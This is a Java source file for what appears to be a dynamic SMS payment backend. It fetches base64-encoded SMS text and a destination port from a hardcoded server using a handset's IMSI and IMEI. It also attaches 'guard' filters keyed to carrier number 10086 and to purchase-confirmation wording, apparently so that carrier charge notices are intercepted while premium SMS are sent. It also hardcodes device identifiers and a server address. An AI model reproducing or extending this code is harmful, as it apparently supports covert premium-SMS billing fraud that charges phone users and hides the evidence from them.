package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class Ffkj2DynamicService implements IDynamicService{

	private static final String TYPE = "ffkj2";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "imsi={imsi}&sid={sid}&paycode={paycode}&app_id={app_id}&channel_id={channel_id}0001&operation={operation}&imei={imei}";
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String sid = channel;
			String paycode = map.get("paycode");
			String app_id = map.get("app_id");
			String channel_id = map.get("channel_id");
			String operation = map.get("operation");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			
			String param = REQUESTMODEL.replace("{sid}",sid).replace("{paycode}",paycode).replace("{app_id}",app_id).replace("{channel_id}",channel_id).replace("{imei}",imei).replace("{imsi}",imsi);
			
			param = param.replace("{operation}", operation);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parseJson(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseJson(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				if(jo.has("smsmsg")){
					String smsmsg = jo.getString("smsmsg");
					String smsport = jo.getString("smsport");
				
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(CommonUtil.base64Decode(smsmsg));
					sms.setSmsDest(smsport);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}
				
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
//		http://121.14.38.20:25494/if_mtk/service?imsi=460004014262556&sid=de68ad65a7dcf01d76926374aa95ac2c&paycode=30000873055601&app_id=300008730556&channel_id=530&operation=102&imei=865308021063756
		String url = "http://121.14.38.20:25494/if_mtk/service";//?cmd=6&price=8&g=10&f=18&imei=860174010602000&imsi=460030912121002&phone=13800138000";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "ffkj2");
		map.put("channel", "10B101a87654322");
		map.put("paycode", "30000830220005");
		map.put("app_id", "300008302200");
		map.put("channel_id", "530");
		map.put("operation", "102");
		map.put("imsi","460004014262556");
		map.put("imei","865308021063756");
		
		System.out.println(new Ffkj2DynamicService().dynamic(map));
		
		
	}

}
